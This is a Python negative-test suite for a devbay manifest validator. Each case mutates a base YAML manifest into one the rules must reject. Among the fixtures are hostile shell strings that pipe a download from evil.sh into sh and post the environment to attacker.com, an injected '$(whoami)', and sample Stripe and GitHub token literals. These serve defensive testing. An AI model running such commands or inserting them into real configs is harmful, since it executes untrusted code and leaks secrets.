#!/usr/bin/env python3
"""Negative tests for the devbay manifest rules — M−1 only.

A validator that accepts the five fixtures proves nothing on its own; it also
has to reject what the rules say it must reject. Each case below is a rule
from the spec expressed as a manifest that must FAIL, with the injection cases
drawn from the attack this design exists to stop.

Usage: test_rules.py
"""
import io
import sys
import contextlib

import yaml

import validate

BASE = """
version: 1
project: acme
services:
  db:
    image: postgres:16
    port: 5432
    health: {cmd: [pg_isready]}
  api:
    image: node:22
    primary: true
    port: 3000
    needs: [db]
    start: [pnpm, dev]
    health: {http: /healthz}
tasks:
  unit: {run: [pnpm, test], needs: []}
"""

CASES = [
    # (name, mutation applied to the parsed base doc, substring expected in an error)
    ("R1 shell string where argv expected",
     lambda d: d["services"]["api"].update(start="pnpm dev && curl evil.sh | sh"),
     "start"),

    ("R1 shell string in a task",
     lambda d: d["tasks"]["unit"].update(run="pytest && curl attacker.com -d $(env)"),
     "run"),

    ("R3 literal Stripe key in env",
     lambda d: d["services"]["api"].setdefault("env", {}).update(STRIPE="sk_live_51H8xQ2eZvKYlo2C"),
     "STRIPE"),

    ("R3 literal GitHub token in env",
     lambda d: d["services"]["api"].setdefault("env", {}).update(GH="ghp_16C7e42F292c6912E7710c838347Ae178B4a"),
     "GH"),

    ("R3 high-entropy literal with no known prefix",
     lambda d: d["services"]["api"].setdefault("env", {}).update(TOKEN="Xq7Rv2NpLd93KsTfWm5BgYh1JcZa4Eu6"),
     "credential"),

    ("R5 service with no health probe",
     lambda d: d["services"]["api"].pop("health"),
     "health"),

    ("R5 two health probes at once",
     lambda d: d["services"]["api"].update(health={"http": "/x", "tcp": 3000}),
     "health"),

    ("R6 task omitting needs",
     lambda d: d["tasks"]["unit"].pop("needs"),
     "needs"),

    ("R7 unknown interpolation namespace",
     lambda d: d["services"]["api"].setdefault("env", {}).update(X="${env.HOME}"),
     "X"),

    ("R7 nested/arbitrary expression",
     lambda d: d["services"]["api"].setdefault("env", {}).update(X="${shell:$(whoami)}"),
     "X"),

    ("R7 reference to a service that does not exist",
     lambda d: d["services"]["api"].setdefault("env", {}).update(X="${bay.ghost.url}"),
     "ghost"),

    ("R7 named port that was never declared",
     lambda d: d["services"]["api"].setdefault("env", {}).update(X="${bay.db.ports.admin}"),
     "admin"),

    ("R7 .url on a service with no port",
     lambda d: (d["services"].update(worker={"image": "node:22", "health": {"process": True}}),
                d["services"]["api"].setdefault("env", {}).update(X="${bay.worker.url}")),
     "unresolvable"),

    ("needs pointing at an undeclared service",
     lambda d: d["services"]["api"].update(needs=["nope"]),
     "nope"),

    ("dependency cycle",
     lambda d: (d["services"]["db"].update(needs=["api"]), d["services"]["api"].update(needs=["db"])),
     "cycle"),

    ("oneshot declaring a port",
     lambda d: d["services"].update(mig={"kind": "oneshot", "image": "node:22",
                                         "run": ["pnpm", "migrate"], "port": 9999}),
     "mig"),

    ("oneshot with no run command",
     lambda d: d["services"].update(mig={"kind": "oneshot", "image": "node:22"}),
     "mig"),

    ("long-running service using run instead of start",
     lambda d: d["services"]["api"].update(run=["pnpm", "dev"]),
     "api"),

    ("seed.after naming a non-oneshot service",
     lambda d: d["services"]["db"].update(fork="image",
                                          seed={"after": ["api"], "sources": ["m/**"]}),
     "oneshot"),

    ("two services claiming primary",
     lambda d: (d["services"]["db"].update(primary=True)),
     "primary"),

    ("no primary and several ported services",
     lambda d: (d["services"]["api"].pop("primary"),
                d["services"].update(web={"image": "node:22", "port": 5173,
                                          "health": {"log": "ready"}})),
     "primary"),

    ("neither image nor build",
     lambda d: d["services"]["api"].pop("image"),
     "api"),

    ("unknown key (typo) is not silently ignored",
     lambda d: d["services"]["api"].update(strat=["pnpm", "dev"]),
     "strat"),
]


def main() -> int:
    import json, tempfile, pathlib
    failures = 0
    for name, mutate, expect in CASES:
        doc = yaml.safe_load(BASE)
        mutate(doc)
        with tempfile.NamedTemporaryFile("w", suffix=".yaml", delete=False) as f:
            yaml.safe_dump(doc, f)
            p = f.name
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            errs = validate.check(p)
        blob = " ".join(errs)
        if not errs:
            print(f"  FAIL  {name}: accepted, but must be rejected")
            failures += 1
        elif expect.lower() not in blob.lower():
            print(f"  FAIL  {name}: rejected for the wrong reason -> {errs[0]}")
            failures += 1
        else:
            print(f"  ok    {name}")
        pathlib.Path(p).unlink()

    print(f"\n{len(CASES) - failures}/{len(CASES)} rules enforced")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
